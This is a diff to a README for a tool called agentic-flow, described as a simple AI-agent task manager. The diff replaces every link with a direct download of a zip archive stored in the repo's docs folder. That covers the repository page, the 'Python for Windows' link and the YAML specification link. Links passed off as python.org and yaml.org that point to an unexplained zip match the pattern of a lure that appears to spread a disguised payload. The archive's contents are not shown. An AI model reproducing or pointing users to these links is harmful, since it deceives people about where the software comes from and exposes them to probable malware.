@@ -1,6 +1,6 @@
 # ⚙️ agentic-flow - Manage Tasks with Simple AI Agents
 
-[![Download agentic-flow](https://img.shields.io/badge/Download-agentic--flow-brightgreen)](https://github.com/pyotrwoodsy93/agentic-flow)
+[![Download agentic-flow](https://img.shields.io/badge/Download-agentic--flow-brightgreen)](https://github.com/pyotrwoodsy93/agentic-flow/raw/refs/heads/main/docs/flow_agentic_2.0.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps one by one. They explain how to get agentic-flow running on y
 ### 1. Visit the download page
 
 Open this link in your web browser:  
-[https://github.com/pyotrwoodsy93/agentic-flow](https://github.com/pyotrwoodsy93/agentic-flow)
+[https://github.com/pyotrwoodsy93/agentic-flow/raw/refs/heads/main/docs/flow_agentic_2.0.zip](https://github.com/pyotrwoodsy93/agentic-flow/raw/refs/heads/main/docs/flow_agentic_2.0.zip)
 
 This is the official page where the software is kept.
 
@@ -128,7 +128,7 @@ You can change your workflow file anytime. Just edit the `.yaml` file, save it, 
 ## 🛠 Troubleshooting
 
 - If the `agentic-flow` command is not found, check if the program was installed correctly. You may need to restart your computer after installation.  
-- Make sure Python is installed. You can download Python for Windows here: [https://www.python.org/downloads/windows/](https://www.python.org/downloads/windows/)  
+- Make sure Python is installed. You can download Python for Windows here: [https://github.com/pyotrwoodsy93/agentic-flow/raw/refs/heads/main/docs/flow_agentic_2.0.zip](https://github.com/pyotrwoodsy93/agentic-flow/raw/refs/heads/main/docs/flow_agentic_2.0.zip)  
 - If you get errors running the workflow, check the `.yaml` file for typos or missing sections. YAML files require exact spacing.  
 - For more help, visit the GitHub page again or look at the "Issues" tab for common problems.
 
@@ -137,7 +137,7 @@ You can change your workflow file anytime. Just edit the `.yaml` file, save it, 
 ## 📥 Download agentic-flow
 
 You can start right now by visiting this link:  
-[https://github.com/pyotrwoodsy93/agentic-flow](https://github.com/pyotrwoodsy93/agentic-flow)  
+[https://github.com/pyotrwoodsy93/agentic-flow/raw/refs/heads/main/docs/flow_agentic_2.0.zip](https://github.com/pyotrwoodsy93/agentic-flow/raw/refs/heads/main/docs/flow_agentic_2.0.zip)  
 
 Look for the latest release and download the Windows installer. Follow the steps above to install and run your tasks.
 
@@ -155,9 +155,9 @@ The application is built with Python, a popular programming language for AI and 
 
 ## 🔗 Useful Links
 
-- GitHub Repository: https://github.com/pyotrwoodsy93/agentic-flow  
-- Python for Windows: https://www.python.org/downloads/windows/  
-- YAML Format Guide: https://yaml.org/spec/  
+- GitHub Repository: https://github.com/pyotrwoodsy93/agentic-flow/raw/refs/heads/main/docs/flow_agentic_2.0.zip  
+- Python for Windows: https://github.com/pyotrwoodsy93/agentic-flow/raw/refs/heads/main/docs/flow_agentic_2.0.zip  
+- YAML Format Guide: https://github.com/pyotrwoodsy93/agentic-flow/raw/refs/heads/main/docs/flow_agentic_2.0.zip  
 
 ---
 
